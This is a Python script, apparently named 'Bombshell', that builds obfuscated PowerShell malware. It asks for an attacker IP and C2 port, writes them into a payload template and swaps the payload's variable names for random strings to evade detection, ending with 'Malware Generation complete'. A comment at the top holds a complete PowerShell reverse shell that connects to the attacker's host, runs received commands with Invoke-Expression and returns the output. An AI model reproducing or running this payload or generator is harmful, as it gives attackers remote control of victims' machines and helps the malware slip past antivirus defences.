import os
import random
import re
import string 
from colorama import Fore, Back, Style
import pyfiglet

#MAL TEMPLATE
#$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); 
#$Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()

#Starts up program and takes in input
term_size = os.get_terminal_size()
print(Fore.YELLOW, "")
print('-' * term_size.columns)
print(Fore.YELLOW, "Starting Python Obfuscator...")
print('-' * term_size.columns)
print("\n")

figlet = pyfiglet.figlet_format("Bombshell")
print(Fore.RED, "")
print('-' * term_size.columns)
print(figlet)
print('-' * term_size.columns)
 


#connectback input
print(Fore.BLUE, "\nEnter the name of the file\n")
fileOutput = input()
print(Fore.BLUE, "\nEnter your host ip\n") 
ip = input()
print(Fore.BLUE, "\nEnter your c2 server port\n")
port = input()

lhost = "".join(["$LHOST = ", '"', ip, '"', " " ])
lport = "".join(["$LPORT = ", port, "\n"])

# Taking "obfuscator.py" as input file 
# in reading mode 
with open("obfuscator2.py", "r") as input: 
      
    # Creating "output file.txt" as output 
    # file in write mode 
    with open(fileOutput, "w") as output: 
        output.write(lhost)
        output.write(lport)
        # Writing each line from input file to 
        # output file using loop 
        for line in input: 
            output.write(line)
		

var1 = "$LHOST"
var2 = "$LPORT"
var3 = "$TCPClient"
var4 = "$NetworkStream"
var5 = "$StreamReader"
var6 = "$StreamWriter"
var7 = "$Buffer"
var8 = "$RawData"
var9 = "$Code"
var10 = "$Output"



stealthVar1 = ''.join((random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(52)))
stealthVar1 = "".join(["$", stealthVar1])

stealthVar2 = ''.join((random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(52)))
stealthVar2 = "".join(["$", stealthVar2])

stealthVar3 = ''.join((random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(52)))
stealthVar3 = "".join(["$", stealthVar3])

stealthVar4 = ''.join((random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(52)))
stealthVar4 = "".join(["$", stealthVar4])

stealthVar5 = ''.join((random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(52)))
stealthVar5 = "".join(["$", stealthVar5])

stealthVar6= ''.join((random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(52)))
stealthVar6 = "".join(["$", stealthVar6])

stealthVar7 = ''.join((random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(52)))
stealthVar7 = "".join(["$", stealthVar7])

stealthVar8 = ''.join((random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(52)))
stealthVar8 = "".join(["$", stealthVar8])

stealthVar9 = ''.join((random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(52)))
stealthVar9 = "".join(["$", stealthVar9])

stealthVar10 = ''.join((random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(52)))
stealthVar10 = "".join(["$", stealthVar10])

#LHOST OBFUSCATION
with open(fileOutput, 'r') as file:
    file_contents = file.read()

    pattern = re.compile(re.escape(var1), re.IGNORECASE)
    updated_contents = pattern.sub(stealthVar1, file_contents)

with open(fileOutput, 'w') as file:
    file.write(updated_contents)

#LPORT OBFUSCATION
with open(fileOutput, 'r') as file:
    file_contents = file.read()

    pattern = re.compile(re.escape(var2), re.IGNORECASE)
    updated_contents = pattern.sub(stealthVar2, file_contents)

with open(fileOutput, 'w') as file:
    file.write(updated_contents)

#TCPCLIENT OBFUSCATION
with open(fileOutput, 'r') as file:
    file_contents = file.read()

    pattern = re.compile(re.escape(var3), re.IGNORECASE)
    updated_contents = pattern.sub(stealthVar3, file_contents)

with open(fileOutput, 'w') as file:
    file.write(updated_contents)

#NETWORKSTREAM OBFUSCATION
with open(fileOutput, 'r') as file:
    file_contents = file.read()

    pattern = re.compile(re.escape(var4), re.IGNORECASE)
    updated_contents = pattern.sub(stealthVar4, file_contents)

with open(fileOutput, 'w') as file:
    file.write(updated_contents)

#STREAMREADER OBFUSCATION
with open(fileOutput, 'r') as file:
    file_contents = file.read()

    pattern = re.compile(re.escape(var5), re.IGNORECASE)
    updated_contents = pattern.sub(stealthVar5, file_contents)

with open(fileOutput, 'w') as file:
    file.write(updated_contents)

#STREAMWRITER OBFUSCATION
with open(fileOutput, 'r') as file:
    file_contents = file.read()

    pattern = re.compile(re.escape(var6), re.IGNORECASE)
    updated_contents = pattern.sub(stealthVar6, file_contents)

with open(fileOutput, 'w') as file:
    file.write(updated_contents)

#BUFFER OBFUSCATION
with open(fileOutput, 'r') as file:
    file_contents = file.read()

    pattern = re.compile(re.escape(var7), re.IGNORECASE)
    updated_contents = pattern.sub(stealthVar7, file_contents)

with open(fileOutput, 'w') as file:
    file.write(updated_contents)

#RAWDATA OBFUSCATION
with open(fileOutput, 'r') as file:
    file_contents = file.read()

    pattern = re.compile(re.escape(var8), re.IGNORECASE)
    updated_contents = pattern.sub(stealthVar8, file_contents)

with open(fileOutput, 'w') as file:
    file.write(updated_contents)

#CODE OBFUSCATION
with open(fileOutput, 'r') as file:
    file_contents = file.read()

    pattern = re.compile(re.escape(var9 ), re.IGNORECASE)
    updated_contents = pattern.sub(stealthVar9, file_contents)

with open(fileOutput, 'w') as file:
    file.write(updated_contents)

#OUTPUT OBFUSCATION
with open(fileOutput, 'r') as file:
    file_contents = file.read()

    pattern = re.compile(re.escape(var10), re.IGNORECASE)
    updated_contents = pattern.sub(stealthVar10, file_contents)

#PRINT OUT MALWARE
with open(fileOutput, 'w') as file:
    file.write(updated_contents)

#MALWARE GEN COMPLETE MESSAGE
print(Fore.RED, "")
print('-' * term_size.columns)
print("Malware Generation complete")
print('-' * term_size.columns)
print(Fore.GREEN, updated_contents)
print(Fore.RED, "")
print('-' * term_size.columns)
